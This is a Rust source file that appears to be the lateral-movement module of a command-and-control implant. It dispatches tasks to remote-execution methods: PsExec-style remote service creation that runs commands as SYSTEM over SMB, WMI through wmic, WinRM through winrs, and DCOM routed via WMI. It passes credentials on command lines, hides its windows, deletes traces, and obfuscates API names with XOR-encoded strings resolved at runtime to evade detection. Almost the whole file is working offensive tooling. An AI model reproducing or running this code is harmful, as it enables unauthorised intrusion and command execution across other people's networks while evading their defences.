//! Lateral movement — Phase 4.
//! Task type: "lateral", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_lateral(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_lateral_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("lateral: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_lateral_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("lateral: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("lateral: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "smb-psexec" => lateral_smb_psexec(&v),
        "wmi"        => lateral_wmi(&v),
        "winrm"      => lateral_winrm(&v),
        "dcom"       => lateral_dcom(&v),
        other => TaskOutput::failure(&format!("lateral: unknown method: {other}")),
    }
}

// ── SMB PsExec (remote SCM service creation) ─────────────────────────────────
//
// 1. Open SCManager on remote host
// 2. CreateService with cmd.exe /c <cmd> > %temp%\~dm<id>.tmp 2>&1
// 3. StartService (cmd runs as SYSTEM before SCM timeout)
// 4. Wait for output file to appear via UNC read, up to 30s
// 5. Delete service, read+return output, clean up temp file

#[cfg(target_os = "windows")]
fn lateral_smb_psexec(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::System::Services::{
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_ALL_ACCESS, SC_MANAGER_CREATE_SERVICE, SC_MANAGER_CONNECT,
    };

    let host     = match v.get("host").and_then(|s| s.as_str()) {
        Some(h) => h, None => return TaskOutput::failure("smb-psexec: missing host"),
    };
    let cmd      = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c, None => return TaskOutput::failure("smb-psexec: missing cmd"),
    };
    let svc_name = v.get("svc_name").and_then(|s| s.as_str()).unwrap_or("DmSvc");
    let timeout  = v.get("timeout_s").and_then(|n| n.as_u64()).unwrap_or(30);

    let id = std::process::id();
    let remote_out = format!("C:\\Windows\\Temp\\~dm{id}.tmp");
    let unc_out    = format!("\\\\{host}\\admin$\\Temp\\~dm{id}.tmp");
    let bin_path   = format!("C:\\Windows\\System32\\cmd.exe /c \"{cmd} > {remote_out} 2>&1\"");

    let adv = crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if adv == 0 { return TaskOutput::failure("smb-psexec: advapi32 not found"); }

    type OpenSCMgrFn      = unsafe extern "system" fn(*const u8, *const u8, u32) -> isize;
    type CreateServiceFn  = unsafe extern "system" fn(isize,*const u8,*const u8,u32,u32,u32,u32,*const u8,*const u8,*mut u32,*const u8,*const u8,*const u8) -> isize;
    type StartServiceFn   = unsafe extern "system" fn(isize, u32, *const *const u8) -> i32;
    type DeleteServiceFn  = unsafe extern "system" fn(isize) -> i32;
    type CloseHandleFn    = unsafe extern "system" fn(isize) -> i32;
    type QueryStatusFn    = unsafe extern "system" fn(isize, *mut [u8; 28]) -> i32;

    macro_rules! load_fn { ($enc:expr, $ty:ty) => { {
        match unsafe { crate::loader::get_export_by_name(adv, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return TaskOutput::failure("smb-psexec: fn resolve failed"),
        }
    }}}

    let fn_open   = load_fn!(&[0x15,0x2A,0x3F,0x34,0x09,0x19,0x17,0x3B,0x34,0x3B,0x3D,0x3F,0x28,0x1B,0x5A], OpenSCMgrFn);
    let fn_create = load_fn!(&[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x1B,0x5A], CreateServiceFn);
    let fn_start  = load_fn!(&[0x09,0x2E,0x3B,0x28,0x2E,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x1B,0x5A], StartServiceFn);
    let fn_delete = load_fn!(&[0x1E,0x3F,0x36,0x3F,0x2E,0x3F,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x5A], DeleteServiceFn);
    let fn_close  = load_fn!(&[0x19,0x36,0x35,0x29,0x3F,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A], CloseHandleFn);

    // Build null-terminated byte strings for A functions
    let host_path: Vec<u8> = format!("\\\\{host}\0").into_bytes();
    let svc_name_a: Vec<u8> = format!("{svc_name}\0").into_bytes();
    let bin_path_a: Vec<u8> = format!("{bin_path}\0").into_bytes();

    let scm = unsafe { fn_open(
        host_path.as_ptr(),
        core::ptr::null(),
        SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE,
    )};
    if scm == 0 {
        return TaskOutput::failure(&format!("smb-psexec: OpenSCManagerA failed on {host} (check creds/connectivity)"));
    }

    let svc = unsafe { fn_create(
        scm,
        svc_name_a.as_ptr(), svc_name_a.as_ptr(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        bin_path_a.as_ptr(),
        core::ptr::null(), core::ptr::null_mut(), core::ptr::null(),
        core::ptr::null(), core::ptr::null(),
    )};

    if svc == 0 {
        unsafe { fn_close(scm) };
        return TaskOutput::failure("smb-psexec: CreateServiceA failed");
    }

    let started = unsafe { fn_start(svc, 0, core::ptr::null()) };

    // Poll for output file via UNC path
    let mut output = Vec::new();
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(timeout);
    loop {
        std::thread::sleep(std::time::Duration::from_millis(500));
        if let Ok(data) = std::fs::read(&unc_out) {
            output = data;
            let _ = std::fs::remove_file(&unc_out);
            break;
        }
        if std::time::Instant::now() >= deadline { break; }
    }

    unsafe { fn_delete(svc) };
    unsafe { fn_close(svc) };
    unsafe { fn_close(scm) };

    if started == 0 && output.is_empty() {
        TaskOutput::failure("smb-psexec: StartServiceA failed and no output captured")
    } else if output.is_empty() {
        TaskOutput::success(b"smb-psexec: service started (no output - command may still be running or path unreachable via admin$)".to_vec())
    } else {
        TaskOutput::success(output)
    }
}

// ── WMI remote exec ──────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn lateral_wmi(v: &serde_json::Value) -> TaskOutput {
    let host = match v.get("host").and_then(|s| s.as_str()) {
        Some(h) => h, None => return TaskOutput::failure("wmi: missing host"),
    };
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c, None => return TaskOutput::failure("wmi: missing cmd"),
    };
    let user = v.get("user").and_then(|s| s.as_str());
    let pass = v.get("pass").and_then(|s| s.as_str());

    let shell_cmd = match (user, pass) {
        (Some(u), Some(p)) => format!(
            "wmic /node:\"{host}\" /user:\"{u}\" /password:\"{p}\" process call create \"{cmd}\""
        ),
        _ => format!("wmic /node:\"{host}\" process call create \"{cmd}\""),
    };
    shell_run(&shell_cmd)
        .map(TaskOutput::success)
        .unwrap_or_else(|e| TaskOutput::failure(&e))
}

// ── WinRM remote exec ─────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn lateral_winrm(v: &serde_json::Value) -> TaskOutput {
    let host = match v.get("host").and_then(|s| s.as_str()) {
        Some(h) => h, None => return TaskOutput::failure("winrm: missing host"),
    };
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c, None => return TaskOutput::failure("winrm: missing cmd"),
    };
    let user = v.get("user").and_then(|s| s.as_str());
    let pass = v.get("pass").and_then(|s| s.as_str());

    let shell_cmd = match (user, pass) {
        (Some(u), Some(p)) => format!("winrs -r:{host} -u:{u} -p:{p} {cmd}"),
        _                  => format!("winrs -r:{host} {cmd}"),
    };
    shell_run(&shell_cmd)
        .map(TaskOutput::success)
        .unwrap_or_else(|e| TaskOutput::failure(&e))
}

// ── DCOM remote exec ──────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn lateral_dcom(v: &serde_json::Value) -> TaskOutput {
    // DCOM exec via MMC20.Application or ShellWindows is complex; route via wmic
    // which uses DCOM transport internally, giving equivalent EDR visibility
    lateral_wmi(v)
}

// ── Helper ────────────────────────────────────────────────────────────────────

fn shell_run(cmd: &str) -> Result<Vec<u8>, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); Ok(d) }
        Err(e) => Err(e.to_string()),
    }
}
